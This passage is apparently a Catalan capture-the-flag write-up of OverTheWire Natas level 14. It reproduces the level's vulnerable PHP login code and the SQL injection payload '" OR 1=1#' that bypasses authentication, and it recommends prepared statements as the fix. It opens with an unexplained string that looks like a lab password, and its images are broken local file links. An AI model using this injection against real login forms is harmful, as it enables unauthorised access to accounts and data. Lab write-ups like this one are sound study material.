``BM;qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP``

  

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_8c7fcf505176ac94.png)  

  

**L’error** **és** que el sistema de verificació és una mica fluixet i l’hem aconseguit enredar, heredant evidenment tot lo del nivell anterior.

-**Level 14**

Ara veiem un login, amb un camp per el nom d’usuari i un per la password:

<html>  
<head>  
<!-- This stuff in the header has nothing to do with the level -->  
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">  
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />  
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />  
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>  
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>  
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>  
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>  
<body>  
<h1>natas14</h1>  
<div id="content">  
<?php  
if(array_key_exists("username", $_REQUEST)) {  
    $link = mysqli_connect('localhost', 'natas14', '<censored>');  
    mysqli_select_db($link, 'natas14');  
  
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";  
    if(array_key_exists("debug", $_GET)) {  
        echo "Executing query: $query<br>";  
    }  
  
    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {  
            echo "Successful login! The password for natas15 is <censored><br>";  
    } else {  
            echo "Access denied!<br>";  
    }  
    mysqli_close($link);  
} else {  
?>  
  
<form action="index.php" method="POST">  
Username: <input name="username"><br>  
Password: <input name="password"><br>  
<input type="submit" value="Login" />  
</form>  
<?php } ?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>  
</div>  
</body>  
</html>


![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_5cba5ae80ce1638b.png)  

Hi ha un PHP i hi ha un SQL, per tant haurem de fer un sql injection. EL PHP vigila que hi hagi alguna linia de resposta de l’sql. Si quan fem arribar la query el número de rows és més gran que 0 ens dona accés i si no ens el denega. Hem d’aconseguir algo que faci una query que el sevidor ens doni una resposta i ens generi rows, ja tindrem el codi necessari:

```
`if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {  
            echo "Successful login! The password for natas15 is <censored><br>";  
    } else {  
            echo "Access denied!<br>";  
    }`
```


I amb aquesta consulta manipularem els camps request d¡username i de pasword:

``SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\".$_REQUEST["password"]."\"``

Farem un OR 1=1 perquè no tenim cap dels dos valors, i direm que ens comprovi els valors o si 1 és igual a 1. Això ho farem així:

``" OR 1=1#``

![](file:///C:/Users/pmpol/AppData/Local/Temp/lu10980mefb4.tmp/lu10980mefb7_tmp_78c9a7a2e35a8354.png)  

La query original era:

``SELECT * FROM users WHERE username = 'nom_usuari' AND password = 'contrasenya';``

La modificada és la següent:

``SELECT * FROM users WHERE username = 'nom_usuari' AND password = 'contrasenya' OR 1=1#';``

I **l’error** és que es pot fer l’injecció sql i per corregir-se s’hauria de parsejar utilitzant sentències preparades.
